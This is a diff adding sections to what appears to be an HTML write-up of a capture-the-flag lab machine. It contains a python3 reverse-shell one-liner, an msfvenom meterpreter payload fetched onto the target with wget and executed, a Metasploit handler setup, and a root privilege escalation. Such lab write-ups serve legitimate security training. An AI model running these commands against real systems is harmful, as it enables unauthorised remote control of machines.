@@ -25,6 +25,58 @@
         <p>
             <img src="./imgs/looney.htb.png" alt="looney.htb">
         </p>
+
+        <h3>Reverse Shell</h3>
+        <p>
+            I set up a <code>netcat</code> listener. And put a <code>python3</code> reverse shell into the webshell.<br>
+            <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</code><br>
+            <img src="./imgs/revshell1.png" alt="reverse shell 1">
+        </p>
+
+        <h3>Metasploit Reverse Shell</h3>
+        <p>
+            Then I decided to upgrage my reverse shell with <code>metasploit</code>
+        </p>
+        <p>
+            Generate payload:<br>
+            <code>
+                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=1212 -f elf -o shell.elf
+            </code><br>
+            Set up python3 http server<br>
+            <code>python3 -m http.server</code><br>
+            Get the <code>shell.elf</code> on the target system.<br>
+            <code>wget http://10.10.14.2:8000/shell.elf</code><br>
+            <img src="./imgs/targetshell.png" alt="targetshell">
+        </p>
+        <p>
+            Now, We need to set up listener in Metasploit.<br>
+            <code>msfconsole</code><br>
+            <code>use exploit/multi/handler</code><br>
+            <code>set payload linux/x64/meterpreter/reverse_tcp</code><br>
+            <code>set lport 1212</code><br>
+            <code>set lhost your-ip</code><br>
+            <code>run</code>
+        </p>
+        <p>
+            Moving back to the target system, we need to set permissions for our <code>shell.elf</code> to be able to execute it.<br>
+            <code>chmod +x shell.elf</code><br>
+            Now, execute it<br>
+            <code>./shell.elf</code><br>
+            <img src="./imgs/shellexecuted.png" alt="shellexecuted"><br>
+            <img src="./imgs/gotshell.png" alt="got metasploit shell">
+        </p>
+        <p>
+            Then I used suggester and used the highlighted vulnerability<br>
+            <img src="./imgs/suggester.png" alt="suggester">
+        </p>
+
+        <h3>Root</h3>
+        <p>
+            I used the exploit<br>
+            <img src="./imgs/root.png" alt="got root"><br>
+            First time it did not work, but after the second try it did give me a root shell!
+            (In metasploit you can use <code>run</code> or <code>exploit</code> basically both of them just start the exploit, so it doesn't matter that first time I used <code>run</code> and the second time I used <code>exploit</code>)
+        </p>
           
     </div>
 </body>
